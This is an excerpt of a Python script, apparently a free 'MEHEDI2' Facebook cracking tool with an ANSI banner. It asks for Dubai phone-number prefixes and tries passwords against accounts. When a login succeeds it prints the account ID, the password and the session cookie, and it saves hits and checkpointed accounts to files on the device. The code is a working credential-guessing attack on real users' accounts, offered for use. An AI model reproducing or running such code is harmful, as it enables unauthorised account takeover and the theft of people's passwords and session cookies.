...
\033[1;37m================= \33[32;45mMEHEDI2\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mMEHEDI2
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m MEHEDIBD
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m FAST
\033[1;37m================= \33[32;45mRN\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO MEHEDIBD TOOLS\33[0;m
...
def i():
    ...
    jalan('\033[1;32m============================================')
    jalan('\033[1;36m     \t     DUBAI CODES\n     \033[1;33m9715, \033[1;33m97152 ,\033[1;33m97158 ,\033[1;33m97155  ...\033[0;97m')
    code = input(' PUT CODE : ')
    print("")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(MEHEDI2)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/MEHEDI2-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(MEHEDI2)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/MEHEDI2-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[MEHEDI2] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
